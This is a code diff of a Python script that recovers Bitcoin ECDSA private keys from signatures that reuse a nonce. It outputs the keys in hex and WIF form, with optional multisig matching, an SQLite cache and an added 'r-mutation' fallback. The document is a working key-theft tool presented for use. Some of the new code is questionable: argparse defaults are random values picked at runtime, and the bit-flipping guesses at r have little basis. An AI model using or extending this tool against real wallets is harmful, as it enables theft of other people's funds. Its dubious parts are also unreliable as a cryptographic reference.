@@ -5,40 +5,31 @@
 recover_stronger.py
 
 Stronger ECDSA recovery from duplicate-R signatures with iterative propagation,
-now with:
-- WSH multisig pub-matching (records may carry pub_candidates list)
-- Optional SQLite caching to dedupe / persist large datasets
-- Extra validation: re-sign check (formula) and r-from-k check (k·G.x mod n)
-- Seeding from previous recovered k/keys across runs
+plus optional *r-mutation* fallback for badly parsed r values.
 
-INPUT (signatures):
-  JSONL (one object per line) OR JSON array.
-  Required fields per signature:
-    - txid (str), vin (int)
-    - z (hex string)  <-- *must be correct sighash digest*
-    - r/s (hex) OR signature_hex (DER+type to parse r/s)
-    - Either:
-        pubkey_hex / pub / pubkey  (single pub)
-      OR
-        pub_candidates (list[str])  (for multisig WSH; any of these may be signer)
-    - (optional) type: "legacy"|"witness"|"witness-wsh"|"witness-wsh-multisig" (free-form)
-    - (optional) sighash (int) — informational
+What’s new vs previous version:
+- WSH multisig pub-matching (via pub_candidates)
+- Optional SQLite cache (--sqlite) for large datasets
+- Extra validations: --resign-check and --check-r-from-k
+- Seeding: --seed-k and --seed-keys
+- NEW: --mutate-r mode (careful!) tries a tiny, bounded neighborhood around r:
+    * +/- small deltas (mod n)
+    * flip up to B low-order bits
+    * optional K random mutations
+  A mutation is accepted ONLY if:
+    - recovery from a pair succeeds, and
+    - ECDSA equation holds for both sigs, and
+    - r_from_k(k) == mutated_r, and
+    - derived pub matches candidate pub(s)
 
-USAGE:
+Usage:
   python3 recover_stronger.py --sigs signatures.jsonl -v
   python3 recover_stronger.py --sigs signatures.jsonl --rlist r_values.txt -v --resign-check --check-r-from-k
-  python3 recover_stronger.py --sigs signatures.json --sqlite sigs.db --export-clusters dupR_clusters.jsonl --report-collisions r_collisions.jsonl -v
-  # reuse seeds across runs:
-  python3 recover_stronger.py --sigs signatures.jsonl --seed-k recovered_k.jsonl --seed-keys recovered_keys.jsonl
-
-OUTPUTS:
-  recovered_keys.jsonl / recovered_keys.txt
-  recovered_k.jsonl  (r -> k candidates)
-  (optional) dupR_clusters.jsonl
-  (optional) r_collisions.jsonl
+  python3 recover_stronger.py --sigs signatures.jsonl --sqlite sigs.db --export-clusters dupR_clusters.jsonl --report-collisions r_collisions.jsonl -v
+  python3 recover_stronger.py --sigs signatures.jsonl --mutate-r --mutate-r-delta 2 --mutate-r-bits 8 --mutate-r-random 8 -v
 """
 
-import argparse, json, sys, os, sqlite3, hashlib, base58
+import argparse, json, sys, os, sqlite3, hashlib, base58, random
 from collections import defaultdict
 from itertools import combinations
 from typing import Dict, Any, List, Tuple, Set
@@ -103,7 +94,7 @@ def ecdsa_ok(s: int, z: int, r: int, d: int, k: int) -> bool:
         return False
 
 def r_from_k(k: int) -> int:
-    """Compute r as x((k·G)) mod n using coincurve (compressed point: header + X)."""
+    """Compute r as x((k·G)) mod n using coincurve."""
     P = PrivateKey(k.to_bytes(32, "big")).public_key
     x = int.from_bytes(P.format(compressed=True)[1:], "big")
     return x % N
@@ -124,14 +115,13 @@ class SigDB:
             rhex TEXT,
             shex TEXT,
             zhex TEXT,
-            pub  TEXT,          -- single pub if known (nullable)
-            pubs_json TEXT,     -- JSON array of candidates if multisig
+            pub  TEXT,
+            pubs_json TEXT,
             PRIMARY KEY (txid, vin)
           );
         """)
         self.conn.execute("CREATE INDEX IF NOT EXISTS ix_sigs_r ON sigs(rhex);")
         self.conn.commit()
-
     def upsert(self, rec: Dict[str, Any]):
         txid = rec.get("txid",""); vin = int(rec.get("vin",0))
         rhex = f"{rec['r']:064x}"; shex = f"{rec['s']:064x}"; zhex = f"{rec['z']:064x}"
@@ -145,12 +135,10 @@ class SigDB:
             pub=COALESCE(excluded.pub, sigs.pub),
             pubs_json=COALESCE(excluded.pubs_json, sigs.pubs_json)
         """, (txid, vin, rhex, shex, zhex, pub, pubs_json))
-        # no per-row commit (faster); caller commits at the end
-
     def commit(self): self.conn.commit()
     def close(self): self.conn.close()
 
-# ===== Loaders =====
+# ===== Loaders / seeds =====
 def load_rlist(path: str) -> Set[int]:
     rset: Set[int] = set()
     if not path or not os.path.exists(path): return rset
@@ -197,27 +185,22 @@ def load_seed_keys(path: str) -> Dict[str, int]:
 def load_signatures_any(path: str, target_pub: str = "", rfilter: Set[int] = None, verbose: bool=False,
                         sqlite_db: SigDB = None) -> List[Dict[str, Any]]:
     """
-    Accepts JSONL (one object per line) OR a JSON array file.
-    Supports:
-      - single pub: pubkey_hex/pub/pubkey
-      - multisig candidates: pub_candidates (list[str])
-    r/s from fields OR parsed from signature_hex. z REQUIRED.
+    Accepts JSONL or a JSON array.
+    Supports single pub (pub/pubkey_hex) or multisig pub_candidates (list[str]).
+    Needs r,s (or signature_hex), and z.
     """
     rows: List[Dict[str, Any]] = []
     tpub = normalize_pub(target_pub) if target_pub else ""
     rfilter = rfilter or set()
-
     if not os.path.exists(path):
         print(f"[error] signatures file not found: {path}")
         return rows
 
     def push_obj(j: Dict[str, Any]):
-        # z
         if "z" not in j: return
         try: z = hexint(j["z"])
         except Exception: return
 
-        # r,s
         r_val = s_val = None
         if "r" in j and "s" in j:
             try:
@@ -234,7 +217,6 @@ def load_signatures_any(path: str, target_pub: str = "", rfilter: Set[int] = Non
         if not (1 <= r_val < N and 1 <= s_val < N): return
         if rfilter and (r_val not in rfilter): return
 
-        # pubs
         pubs: List[str] = []
         single = normalize_pub(j.get("pubkey_hex") or j.get("pub") or j.get("pubkey"))
         if single:
@@ -242,30 +224,23 @@ def load_signatures_any(path: str, target_pub: str = "", rfilter: Set[int] = Non
         elif "pub_candidates" in j and isinstance(j["pub_candidates"], list):
             pubs = [normalize_pub(p) for p in j["pub_candidates"] if isinstance(p, str)]
             pubs = [p for p in pubs if p]
-            if not pubs:
-                return
+            if not pubs: return
         else:
-            # no pub info at all? skip
             return
 
-        # txid/vin
         txid = j.get("txid","")
         try: vin = int(j.get("vin",0))
         except Exception: vin = 0
 
         rec = {"txid": txid, "vin": vin, "r": r_val, "s": s_val, "z": z, "pubs": pubs}
-        # optional convenience: if only one pub, also expose "pub"
-        if len(pubs) == 1:
-            rec["pub"] = pubs[0]
-
+        if tpub and (single or pubs) and (tpub not in pubs):  # filter by pub
+            return
+        if len(pubs) == 1: rec["pub"] = pubs[0]
         rows.append(rec)
 
-        # optional SQLite cache
         if sqlite_db:
-            try:
-                sqlite_db.upsert(rec)
-            except Exception:
-                pass
+            try: sqlite_db.upsert(rec)
+            except Exception: pass
 
     with open(path, "r", encoding="utf-8") as f:
         data = f.read().strip()
@@ -291,9 +266,7 @@ def load_signatures_any(path: str, target_pub: str = "", rfilter: Set[int] = Non
                     continue
                 if isinstance(j, dict): push_obj(j)
 
-    if sqlite_db:
-        sqlite_db.commit()
-
+    if sqlite_db: sqlite_db.commit()
     if verbose:
         print(f"[info] loaded {len(rows)} usable signatures"
               + (f" (filtered by {len(rfilter)} r-values)" if rfilter else ""))
@@ -306,11 +279,7 @@ def index_by_r(rows: List[Dict[str, Any]]) -> Dict[int, List[Dict[str, Any]]]:
     return m
 
 def index_by_r_pub_candidates(rows: List[Dict[str, Any]]) -> Dict[int, Dict[str, List[Dict[str, Any]]]]:
-    """
-    r -> pub -> list of recs where pub is among rec['pubs'].
-    (expands multisig candidates; safe — final math verification will filter.)
-    """
-    out = defaultdict(lambda: defaultdict(list))
+    out = defaultdict(lambda: defaultdict(list))  # r -> pub -> [recs]
     for rec in rows:
         r = rec["r"]
         for p in rec["pubs"]:
@@ -328,14 +297,12 @@ def index_recs_by_pub(rows: List[Dict[str, Any]]) -> Dict[str, List[Dict[str, An
 def recover_from_pair(r: int, a: Dict[str, Any], b: Dict[str, Any]):
     s1, s2, z1, z2 = a["s"], b["s"], a["z"], b["z"]
     cands = []
-    # Path 1: s1 - s2
     denom = (s1 - s2) % N
     if denom != 0:
         k = ((z1 - z2) * inv(denom)) % N
         d = ((s1 * k - z1) * inv(r)) % N
         if 1 <= d < N and k != 0:
             cands.append((d, k, "diff"))
-    # Path 2: s1 + s2 (handles s ↔ N-s malleation)
     denom2 = (s1 + s2) % N
     if denom2 != 0:
         k2 = ((z1 + z2) * inv(denom2)) % N
@@ -347,10 +314,31 @@ def recover_from_pair(r: int, a: Dict[str, Any], b: Dict[str, Any]):
 def add_k_candidate(r: int, k: int, store: Dict[int, Set[int]]):
     if k and 0 < k < N:
         store.setdefault(r, set()).add(k)
-        store[r].add((N - k) % N)  # include complement for sign flip
+        store[r].add((N - k) % N)
+
+# --- NEW: r-mutation neighborhood generator ---
+def gen_r_mutations(r: int, delta: int, bits: int, rand_count: int, rng: random.Random) -> List[int]:
+    muts: Set[int] = set()
+    r = r % N
+    muts.add(r)
+    # +/- small deltas
+    for d in range(1, max(1, delta) + 1):
+        muts.add((r + d) % N)
+        muts.add((r - d) % N)
+    # flip low-order bits (bounded)
+    bits = max(0, min(bits, 16))  # keep sane
+    for i in range(bits):
+        muts.add((r ^ (1 << i)) % N)
+    # a few random tweaks near r
+    for _ in range(max(0, rand_count)):
+        # random 16-bit mask around r
+        mask = rng.getrandbits(16)
+        shift = rng.randrange(0, 240, 8)  # keep it local-ish but varied
+        muts.add((r ^ (mask << shift)) % N)
+    return list(muts)
 
 def main():
-    ap = argparse.ArgumentParser(description="Stronger ECDSA recovery w/ multisig matching, SQLite cache, extra checks")
+    ap = argparse.ArgumentParser(description="Stronger ECDSA recovery w/ multisig, SQLite, extra checks, and r-mutation fallback")
     ap.add_argument("--sigs", default="signatures.jsonl", help="signatures.jsonl or .json")
     ap.add_argument("--rlist", default="", help="optional r_values.txt (filter)")
     ap.add_argument("--sqlite", default="", help="optional SQLite db path for caching (e.g., sigs.db)")
@@ -367,8 +355,16 @@ def main():
     ap.add_argument("--export-clusters",  default="", help="write dupR_clusters.jsonl for (pub,r) clusters (>=2)")
     ap.add_argument("--resign-check", action="store_true", help="extra check: recompute s and compare")
     ap.add_argument("--check-r-from-k", action="store_true", help="extra check: r == x(k·G) mod n")
+    # NEW r-mutation knobs
+    ap.add_argument("--mutate-r", action="store_true", help="enable r-mutation fallback when primary recovery fails")
+    ap.add_argument("--mutate-r-delta", type=int, default=random.randint(1, 128), help="try r±d for d in [1..delta] (mod n)")
+    ap.add_argument("--mutate-r-bits",  type=int, default=random.randint(1, 257), help="flip up to this many low-order bits of r")
+    ap.add_argument("--mutate-r-random",type=int, default=random.randint(1, 257), help="try this many random r tweaks per cluster")
+    ap.add_argument("--rng-seed", type=int, default=random.randint(1, N), help="seed for reproducible random r tweaks (0 = entropy)")
     ap.add_argument("-v", "--verbose", action="store_true", help="verbose logging")
     args = ap.parse_args()
+
+    rng = random.Random(os.urandom(16) if args.rng_seed == 0 else args.rng_seed)
 
     rset = load_rlist(args.rlist)
     sqlite_db = SigDB(args.sqlite) if args.sqlite else None
@@ -421,7 +417,7 @@ def main():
     recovered: List[Dict[str, Any]] = []
     seen_privs: Set[int] = set(recovered_priv_by_pub.values()) if recovered_priv_by_pub else set()
 
-    # Phase A: primary recovery per (r, pub) where count >= min_count
+    # Phase A: primary recovery per (r, pub)
     for r_val, pubmap in r_pub_index.items():
         for pub, lst in pubmap.items():
             if len(lst) < args.min_count:
@@ -432,23 +428,18 @@ def main():
             if args.verbose:
                 print(f"[cluster pub={pub[:16]}… r={r_val:064x}] count={len(lst)}")
 
+            found_here = False
+
+            # 1) normal path with exact r
             for a, b in combinations(lst, 2):
                 for d, k, why in recover_from_pair(r_val, a, b):
-                    # extra checks
                     if args.check_r_from_k and r_from_k(k) != (r_val % N):
                         continue
                     if args.resign_check and not (ecdsa_ok(a["s"], a["z"], r_val, d, k) and ecdsa_ok(b["s"], b["z"], r_val, d, k)):
                         continue
+                    pk_c, pk_u = derive_pub_hex(d)
+                    if pub not in (pk_c, pk_u): continue
 
-                    # pub verify
-                    try:
-                        pk_c, pk_u = derive_pub_hex(d)
-                    except Exception:
-                        continue
-                    if pub not in (pk_c, pk_u):
-                        continue
-
-                    # accept
                     if d not in seen_privs:
                         seen_privs.add(d)
                         recovered_priv_by_pub[pub] = d
@@ -469,10 +460,8 @@ def main():
                         print(f"  WIF   : {wif}")
                         print(f"  via   : {a['txid']}:{a['vin']}  &  {b['txid']}:{b['vin']}  ({why})")
                         print("="*62)
-
-                    # seed k candidates for this r
                     add_k_candidate(r_val, k, recovered_k_by_r)
-                    # plus reinforce via d over both sigs
+                    # reinforce k via both sigs
                     try:
                         k_a = ((a["z"] + (r_val * d) % N) % N) * inv(a["s"]) % N
                         add_k_candidate(r_val, k_a, recovered_k_by_r)
@@ -480,6 +469,69 @@ def main():
                         add_k_candidate(r_val, k_b, recovered_k_by_r)
                     except Exception:
                         pass
+                    found_here = True
+
+            # 2) r-mutation fallback (only if nothing found with exact r)
+            if args.mutate_r and not found_here:
+                mutants = gen_r_mutations(r_val, args.mutate_r_delta, args.mutate_r_bits, args.mutate_r_random, rng)
+                # keep deterministic: try small ones first
+                mutants_sorted = sorted(mutants, key=lambda x: (0 if x==r_val else 1,
+                                                                (x-r_val) % N if (x-r_val) % N < (r_val-x) % N else (r_val-x) % N))
+                for r_try in mutants_sorted:
+                    if r_try == r_val:  # already tried
+                        continue
+                    if args.verbose:
+                        print(f"[mutate-r] trying r={r_try:064x} instead of {r_val:064x} for pub={pub[:16]}…")
+
+                    ok_cluster = False
+                    for a, b in combinations(lst, 2):
+                        for d, k, why in recover_from_pair(r_try, a, b):
+                            # MUST pass strict checks for acceptance
+                            if args.check_r_from_k and r_from_k(k) != (r_try % N):
+                                continue
+                            if args.resign_check and not (ecdsa_ok(a["s"], a["z"], r_try, d, k) and ecdsa_ok(b["s"], b["z"], r_try, d, k)):
+                                continue
+                            pk_c, pk_u = derive_pub_hex(d)
+                            if pub not in (pk_c, pk_u):  # wrong pub
+                                continue
+
+                            # accept recovery under mutated r
+                            if d not in seen_privs:
+                                seen_privs.add(d)
+                                recovered_priv_by_pub[pub] = d
+                                wif = to_wif(d, compressed=True, mainnet=not args.testnet)
+                                rec = {
+                                    "pubkey": pub, "priv_hex": f"{d:064x}", "wif": wif,
+                                    "r": f"{r_try:064x}",
+                                    "r_original": f"{r_val:064x}",
+                                    "proof": [
+                                        {"txid": a["txid"], "vin": a["vin"]},
+                                        {"txid": b["txid"], "vin": b["vin"]}
+                                    ],
+                                    "method": f"primary-mutate-{why}"
+                                }
+                                recovered.append(rec)
+                                print("="*62)
+                                print(f"[RECOVERED via r-mutation] pub={pub}")
+                                print(f"  d (hex): {d:064x}")
+                                print(f"  WIF   : {wif}")
+                                print(f"  r*    : {r_try:064x}  (orig {r_val:064x})")
+                                print(f"  via   : {a['txid']}:{a['vin']}  &  {b['txid']}:{b['vin']}  ({why})")
+                                print("="*62)
+                            add_k_candidate(r_try, k, recovered_k_by_r)
+                            # reinforce with computed ks under r_try
+                            try:
+                                k_a = ((a["z"] + (r_try * d) % N) % N) * inv(a["s"]) % N
+                                add_k_candidate(r_try, k_a, recovered_k_by_r)
+                                k_b = ((b["z"] + (r_try * d) % N) % N) * inv(b["s"]) % N
+                                add_k_candidate(r_try, k_b, recovered_k_by_r)
+                            except Exception:
+                                pass
+                            ok_cluster = True
+                            found_here = True
+                            break
+                        if ok_cluster: break
+                    if ok_cluster: break  # stop at first successful mutant
 
     # Helpers for propagation
     def expand_k_from_privs() -> int:
@@ -504,10 +556,7 @@ def main():
             if args.verbose:
                 print(f"[propagate r={r_val:064x}] trying {len(kset)} k-candidate(s) over {len(rmap.get(r_val, []))} signature(s)")
             for sig in rmap.get(r_val, []):
-                # skip if already recovered *this* pub
-                # (for multisig we accept if derived pub ∈ sig['pubs'])
                 for k in list(kset):
-                    # checks
                     if args.check_r_from_k and r_from_k(k) != (r_val % N):
                         continue
                     try:
@@ -517,18 +566,14 @@ def main():
                             continue
                         pk_c, pk_u = derive_pub_hex(d)
                         matched_pub = pk_c if pk_c in sig["pubs"] else (pk_u if pk_u in sig["pubs"] else None)
-                        if not matched_pub:
-                            continue
+                        if not matched_pub: continue
                         if matched_pub in recovered_priv_by_pub and recovered_priv_by_pub[matched_pub] == d:
                             continue
                     except Exception:
                         continue
 
-                    # accept
-                    if d in seen_privs and all(recovered_priv_by_pub.get(p) != d for p in sig["pubs"]):
-                        # same d tied to other pub? unlikely, but keep unique per pub
+                    if d in set(recovered_priv_by_pub.values()) and all(recovered_priv_by_pub.get(p) != d for p in sig["pubs"]):
                         pass
-                    seen_privs.add(d)
                     recovered_priv_by_pub[matched_pub] = d
                     wif = to_wif(d, compressed=True, mainnet=not args.testnet)
                     rec = {
@@ -562,8 +607,8 @@ def main():
 
     # Outputs
     if not recovered:
-        print("Tried primary clusters and iterative propagation; no valid recovery.")
-        print("Note: need at least one (r,pub) cluster OR a seed k/key to bootstrap.")
+        print("Tried primary clusters, r-mutation (if enabled), and propagation; no valid recovery.")
+        print("Most failures are due to wrong z (sighash), Taproot/Schnorr, or non-matching multisig pub.")
         sys.exit(0)
 
     with open(args.out_json, "w", encoding="utf-8") as f:
@@ -575,8 +620,9 @@ def main():
                 via = f"{rec['proof'][0]['txid']}:{rec['proof'][0]['vin']} & {rec['proof'][1]['txid']}:{rec['proof'][1]['vin']}"
             else:
                 via = f"{rec['proof'][0]['txid']}:{rec['proof'][0]['vin']}"
+            extra = f" (origR={rec.get('r_original')})" if 'r_original' in rec else ""
             f.write(f"PUB={rec['pubkey']} PRIV={rec['priv_hex']} WIF={rec['wif']} "
-                    f"R={rec['r']} via {via} ({rec['method']})\n")
+                    f"R={rec['r']}{extra} via {via} ({rec['method']})\n")
 
     with open(args.out_k, "w", encoding="utf-8") as f:
         for r_val, kset in recovered_k_by_r.items():
@@ -596,15 +642,5 @@ if __name__ == "__main__":
 
 
 """
-python3 recover_stronger.py --sigs signatures.jsonl \
-  --report-collisions r_collisions.jsonl \
-  --export-clusters dupR_clusters.jsonl \
-  --sqlite sigs.db \
-  --resign-check --check-r-from-k -v
-
-
-სიდებით აღდგენა:
-python3 recover_stronger.py --sigs more_sigs.jsonl \
-  --seed-k recovered_k.jsonl --seed-keys recovered_keys.jsonl \
-  --sqlite sigs.db -v
+python3 recover_stronger.py --sigs signatures.jsonl --mutate-r --resign-check --check-r-from-k
 """
